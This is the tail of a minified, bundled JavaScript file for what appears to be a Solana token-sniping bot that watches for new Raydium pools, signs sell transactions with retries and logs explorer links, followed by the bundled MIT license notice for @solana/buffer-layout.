on({payerKey:$.publicKey,recentBlockhash:k.blockhash,instructions:[it.setComputeUnitPrice({microLamports:4e5}),it.setComputeUnitLimit({units:2e5}),...S.instructions,ir(l.address,$.publicKey,$.publicKey)]}).compileToV0Message(),z=new sn(N);z.sign([$,...S.signers]);let U=await W.sendRawTransaction(z.serialize(),{preflightCommitment:ne});A.info({mint:e,signature:U},"Sent SELL TX...");let H=await W.confirmTransaction({signature:U,lastValidBlockHeight:k.lastValidBlockHeight,blockhash:k.blockhash},ne);if(H.value.err){A.debug(H.value.err),A.info({mint:e,signature:U},"Error confirming sell tx");continue}return A.info({mint:e,signature:U,url:`https://solscan.io/tx/${U}?cluster=${ln}`,dex:`https://dexscreener.com/solana/${e}?maker=${$.publicKey}`},`Confirmed sell tx... Sold at: ${o}	Net Profit: ${b*100}%`),!0}catch(l){s++,A.debug(l),A.error({mint:e},`Failed to sell token, retry: ${s}/${tn}`)}while(s<tn);return!0}function gn(){if(!at)return;let r=Me.length;Me=cn.readFileSync(un.join(__dirname,"snipedlist.txt"),"utf-8").split(`
`).map(t=>t.trim()).filter(t=>t),Me.length!=r&&A.info(`Loaded snipe list: ${Me.length}`)}function Ir(r){return at?Me.includes(r):!0}var kr=async()=>{try{await gr(),console.log("Authentication successful."),await wr()}catch(o){o instanceof Error?console.error(o.message):console.error("An unknown error occurred."),process.exit(1)}let r=Math.floor(new Date().getTime()/1e3),e=W.onProgramAccountChange(rt,async o=>{let s=o.accountId.toString(),l=Le.decode(o.accountInfo.data),b=parseInt(l.poolOpenTime.toString()),S=Jt.has(s);if(b>r&&!S){Jt.add(s);let k=br(o.accountId,l)}},ne,[{dataSize:Le.span},{memcmp:{offset:Le.offsetOf("quoteMint"),bytes:K.mint.toBase58()}},{memcmp:{offset:Le.offsetOf("marketProgramId"),bytes:It.toBase58()}},{memcmp:{offset:Le.offsetOf("status"),bytes:an.encode([6,0,0,0,0,0,0,0])}}]),t=W.onProgramAccountChange(It,async o=>{let s=o.accountId.toString();if(!en.has(s)){en.add(s);let b=Sr(o)}},ne,[{dataSize:Tt.span},{memcmp:{offset:Tt.offsetOf("quoteMint"),bytes:K.mint.toBase58()}}]);if(mn){let o=W.onProgramAccountChange(rn,async s=>{let l=rr.decode(s.accountInfo.data);if(s.accountId.equals(st))return;let b=!1;for(;!b;){setTimeout(()=>{},1e3);let S=await Xt(l.mint.toBase58());S&&(A.info(l.mint,`Current Price: ${S} SOL`),b=await Or(s.accountId,l.mint,l.amount,S))}},ne,[{dataSize:165},{memcmp:{offset:32,bytes:$.publicKey.toBase58()}}])}A.info("-------------------- SEARCH NEW POOLS --------------------"),at&&setInterval(gn,dr)};kr();export{Er as checkMintable,Sr as processOpenBookMarket,br as processRaydiumPool};
/*! Bundled license information:

@solana/buffer-layout/lib/Layout.js:
  (**
   * Support for translating between Uint8Array instances and JavaScript
   * native types.
   *
   * {@link module:Layout~Layout|Layout} is the basis of a class
   * hierarchy that associates property names with sequences of encoded
   * bytes.
   *
   * Layouts are supported for these scalar (numeric) types:
   * * {@link module:Layout~UInt|Unsigned integers in little-endian
   *   format} with {@link module:Layout.u8|8-bit}, {@link
   *   module:Layout.u16|16-bit}, {@link module:Layout.u24|24-bit},
   *   {@link module:Layout.u32|32-bit}, {@link
   *   module:Layout.u40|40-bit}, and {@link module:Layout.u48|48-bit}
   *   representation ranges;
   * * {@link module:Layout~UIntBE|Unsigned integers in big-endian
   *   format} with {@link module:Layout.u16be|16-bit}, {@link
   *   module:Layout.u24be|24-bit}, {@link module:Layout.u32be|32-bit},
   *   {@link module:Layout.u40be|40-bit}, and {@link
   *   module:Layout.u48be|48-bit} representation ranges;
   * * {@link module:Layout~Int|Signed integers in little-endian
   *   format} with {@link module:Layout.s8|8-bit}, {@link
   *   module:Layout.s16|16-bit}, {@link module:Layout.s24|24-bit},
   *   {@link module:Layout.s32|32-bit}, {@link
   *   module:Layout.s40|40-bit}, and {@link module:Layout.s48|48-bit}
   *   representation ranges;
   * * {@link module:Layout~IntBE|Signed integers in big-endian format}
   *   with {@link module:Layout.s16be|16-bit}, {@link
   *   module:Layout.s24be|24-bit}, {@link module:Layout.s32be|32-bit},
   *   {@link module:Layout.s40be|40-bit}, and {@link
   *   module:Layout.s48be|48-bit} representation ranges;
   * * 64-bit integral values that decode to an exact (if magnitude is
   *   less than 2^53) or nearby integral Number in {@link
   *   module:Layout.nu64|unsigned little-endian}, {@link
   *   module:Layout.nu64be|unsigned big-endian}, {@link
   *   module:Layout.ns64|signed little-endian}, and {@link
   *   module:Layout.ns64be|unsigned big-endian} encodings;
   * * 32-bit floating point values with {@link
   *   module:Layout.f32|little-endian} and {@link
   *   module:Layout.f32be|big-endian} representations;
   * * 64-bit floating point values with {@link
   *   module:Layout.f64|little-endian} and {@link
   *   module:Layout.f64be|big-endian} representations;
   * * {@link module:Layout.const|Constants} that take no space in the
   *   encoded expression.
   *
   * and for these aggregate types:
   * * {@link module:Layout.seq|Sequence}s of instances of a {@link
   *   module:Layout~Layout|Layout}, with JavaScript representation as
   *   an Array and constant or data-dependent {@link
   *   module:Layout~Sequence#count|length};
   * * {@link module:Layout.struct|Structure}s that aggregate a
   *   heterogeneous sequence of {@link module:Layout~Layout|Layout}
   *   instances, with JavaScript representation as an Object;
   * * {@link module:Layout.union|Union}s that support multiple {@link
   *   module:Layout~VariantLayout|variant layouts} over a fixed
   *   (padded) or variable (not padded) span of bytes, using an
   *   unsigned integer at the start of the data or a separate {@link
   *   module:Layout.unionLayoutDiscriminator|layout element} to
   *   determine which layout to use when interpreting the buffer
   *   contents;
   * * {@link module:Layout.bits|BitStructure}s that contain a sequence
   *   of individual {@link
   *   module:Layout~BitStructure#addField|BitField}s packed into an 8,
   *   16, 24, or 32-bit unsigned integer starting at the least- or
   *   most-significant bit;
   * * {@link module:Layout.cstr|C strings} of varying length;
   * * {@link module:Layout.blob|Blobs} of fixed- or variable-{@link
   *   module:Layout~Blob#length|length} raw data.
   *
   * All {@link module:Layout~Layout|Layout} instances are immutable
   * after construction, to prevent internal state from becoming
   * inconsistent.
   *
   * @local Layout
   * @local ExternalLayout
   * @local GreedyCount
   * @local OffsetLayout
   * @local UInt
   * @local UIntBE
   * @local Int
   * @local IntBE
   * @local NearUInt64
   * @local NearUInt64BE
   * @local NearInt64
   * @local NearInt64BE
   * @local Float
   * @local FloatBE
   * @local Double
   * @local DoubleBE
   * @local Sequence
   * @local Structure
   * @local UnionDiscriminator
   * @local UnionLayoutDiscriminator
   * @local Union
   * @local VariantLayout
   * @local BitStructure
   * @local BitField
   * @local Boolean
   * @local Blob
   * @local CString
   * @local Constant
   * @local bindConstructorLayout
   * @module Layout
   * @license MIT
   * @author Peter A. Bigot
   * @see {@link https://github.com/pabigot/buffer-layout|buffer-layout on GitHub}
   *)
*/
